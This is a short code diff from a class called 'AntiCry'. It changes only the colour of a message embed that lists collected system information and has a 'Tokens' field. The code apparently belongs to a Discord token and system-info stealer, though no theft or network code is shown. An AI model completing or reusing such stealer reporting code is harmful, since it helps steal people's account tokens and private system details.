@@ -304,7 +304,7 @@ class AntiCry:
                 system_info += f"{key} : {self.INFO[key]}\n"
 
             embed = {
-                "color": 0xffffff,
+                "color": 0x1c1c1d,
                         "fields": [
                             {
                                 "name": "<:z_logo_trustpilot:1040751302294122507> **Tokens**",
